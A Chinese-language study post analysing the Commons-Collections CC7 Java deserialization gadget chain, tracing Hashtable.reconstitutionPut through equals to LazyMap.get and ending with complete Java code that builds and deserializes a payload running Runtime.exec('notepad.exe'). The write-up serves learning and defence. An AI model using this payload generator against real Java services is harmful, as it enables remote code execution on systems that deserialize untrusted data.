---
title: Commons-Collections篇08-CC7链
date: 2025-9-29 21:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 调用链

![image-20250930181113452](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930181113452.png)

# CC7链分析

## 流程分析

后半段链就是`CC1链-Lazymap链`，CC7链中调用get方法的函数变了，`AbstractMap.equals()`调用了get方法，但是我们用的时候实际用的是`HashMap.equals()`，但是`HashMap`没有这个方法，所以用了父类的

![image-20250930143350184](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930143350184.png)

![image-20250930160114090](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930160114090.png)

`AbstractMapDecorator.equals()`调用了`equals()`，这里也是一样，用的时候是用了`Lazymap.equals()`，但是`Lazymap`没有`equals()`，所以用了父类的`equals()`

![image-20250930160138076](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930160138076.png)

![image-20250930143305112](././Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930143305112.png)

`HashTable`中`reconstitutionPut`方法调用了`equals()方法`，但是需要进入for循环，并且满足if前面hash值相等的条件才能走到`equals()`方法

`for`循环是遍历`table`中的内容，`readObject`第一次循环是`table`中还是空，在`reconstitutionPut`，for循环下面才会把第一个值赋给`table`，`readObject`第二次循环时`table`中才有内容才可以进入`for`循环，并且还需要找两个相同hash值的值

![image-20250930143215138](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930143215138.png)

并且在`readObject`中调用了`reconstitutionPut`方法，

![image-20250930143240583](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930143240583.png)

看序列化代码，for循环里先将table数组的长度写入，然后再挨个写入键值对的值，在反序列化代码最后，是利用for循环从序列化流中挨个读键值对内容，然后再用`reconstitutionPut`方法将键值对写到`table`中去

![image-20250930161105095](./Commons-Collections%E7%AF%8708-CC7%E9%93%BE/image-20250930161105095.png)

## 代码实现

### equals方法调用get

我们传入两个`LazyMap`进行`equals`比较，是可以调用get方法成功执行代码，yy和zZ经过测试hahsCode的值是一样的

```java
        Map <Object,Object> hashMap1 = new HashMap<>();
        Map <Object,Object> hashMap2 = new HashMap<>();
        Map decoratemap1 = LazyMap.decorate(hashMap1,chainedTransformer);
        decoratemap1.put("yy",1);

        Map decoratemap2 = LazyMap.decorate(hashMap2,chainedTransformer);
        decoratemap2.put("zZ",1);

        decoratemap2.equals(decoratemap1);
```

## **Hashtable.reconstitutionPut**

上面说到反序列化时`readObject`中会通过`for`循环将序列化流中内容拿出来然后通过`reconstitutionPut`再装到`table`里，想要进入`reconstitutionPut`的for循环就要写入不止一个值，我们写入两个值，并且

```java
        Hashtable hashtable = new Hashtable();
        hashtable.put(decoratemap1,1);
        hashtable.put(decoratemap2,1);
```

并且put时也会调用equals函数，所以我们要在前面将`ChainedTransformer`的值改为空，让链子不能正常执行，在put完再改回来，并且put完decoratemap2的size变为2，要删掉这个多余的key值

# 完整代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.*;

public class CC7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform("aaa");
        Map <Object,Object> hashMap1 = new HashMap<>();
        Map <Object,Object> hashMap2 = new HashMap<>();
        Map decoratemap1 = LazyMap.decorate(hashMap1,chainedTransformer);
        decoratemap1.put("yy",1);

        Map decoratemap2 = LazyMap.decorate(hashMap2,chainedTransformer);
        decoratemap2.put("zZ",1);


        Hashtable hashtable = new Hashtable();
        hashtable.put(decoratemap1,1);
        hashtable.put(decoratemap2,1);
        decoratemap2.remove("yy");
        
        Class c =chainedTransformer.getClass();
        Field transformer = c.getDeclaredField("iTransformers");
        transformer.setAccessible(true);
        transformer.set(chainedTransformer,transformers);

        serialize(hashtable);
        unserialize();

    }
    public static void serialize(Object obj) throws Exception{
        java.io.ObjectOutputStream objectOutputStream = new java.io.ObjectOutputStream(new java.io.FileOutputStream("cc7.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
    public static void unserialize() throws Exception{
        java.io.ObjectInputStream objectInputStream = new java.io.ObjectInputStream(new java.io.FileInputStream("cc7.ser"));
        Object obj = objectInputStream.readObject();
        objectInputStream.close();
    }
}

```

